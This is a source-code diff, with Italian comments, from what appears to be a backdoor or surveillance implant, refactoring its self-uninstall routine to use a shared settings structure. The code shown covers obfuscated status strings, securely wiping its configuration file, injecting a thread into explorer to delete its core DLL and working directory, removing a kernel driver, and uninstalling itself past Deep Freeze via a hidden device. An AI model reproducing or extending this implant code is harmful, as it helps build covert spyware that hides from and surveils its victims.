@@ -7,7 +7,6 @@
 extern BOOL IsDeepFreeze();
 extern void UnlockConfFile();
 extern BYTE bin_patched_backdoor_id[];
-extern BOOL g_remove_driver;
 
 // Codici delle action function
 #define AF_SYNCRONIZE 1
@@ -282,10 +281,10 @@ BOOL WINAPI DA_Uninstall(BYTE *dummy_param)
 {
 	char conf_path[DLLNAMELEN];
 
-	ScrambleString ssok("QM\r\n", is_demo_version); // "OK\r\n"
-	ScrambleString ss1("_ 4vE77UPC 8WW oEidWl1..........", is_demo_version); // "- Stopping all modules.........."
-	ScrambleString ss2("_ jU7UPC Edv zUWl1..............", is_demo_version); // "- Wiping out files.............."
-	ScrambleString ss3("_ BWl8PUPC oloEtJ...............", is_demo_version); // "- Cleaning memory..............."
+	ScrambleString ssok("QM\r\n", shared.is_demo_version); // "OK\r\n"
+	ScrambleString ss1("_ 4vE77UPC 8WW oEidWl1..........", shared.is_demo_version); // "- Stopping all modules.........."
+	ScrambleString ss2("_ jU7UPC Edv zUWl1..............", shared.is_demo_version); // "- Wiping out files.............."
+	ScrambleString ss3("_ BWl8PUPC oloEtJ...............", shared.is_demo_version); // "- Cleaning memory..............."
 
 	// Aspetta che il thread di azioni istantanee sia morto.
 	// A quel punto ha pieni poteri su tutto visto che viene gestita solo 
@@ -329,20 +328,20 @@ BOOL WINAPI DA_Uninstall(BYTE *dummy_param)
 	// attivabile al successivo avvio, ma senza file di configurazione
 	// (non si disinstallerebbe piu').
 	UnlockConfFile();
-	HM_WipeFileA(HM_CompletePath(H4_CONF_FILE, conf_path));
+	HM_WipeFileA(HM_CompletePath(shared.H4_CONF_FILE, conf_path));
 
 	// Tenta di iniettare un thread in explorer per cancellare 
 	// la DLL core e la directory di lavoro (non puo' cancellarsi da sola)
 	HM_RemoveCore();
 
 	//Cancella il driver sull'ultima istanza
-	if (g_remove_driver && IsLastInstance())
+	if (shared.g_remove_driver && IsLastInstance())
 		HM_RemoveDriver();
 
 	// Tenta l'uninstall dal disco reale in caso di deep freeze
 	if (IsDeepFreeze()) {
 		HideDevice dev_df;
-		DFUninstall(&dev_df, (unsigned char *)H4_HOME_PATH, (unsigned char *)REGISTRY_KEY_NAME);
+		DFUninstall(&dev_df, (unsigned char *)shared.H4_HOME_PATH, (unsigned char *)shared.REGISTRY_KEY_NAME);
 	}
 	REPORT_STATUS_LOG(ssok.get_str());
 
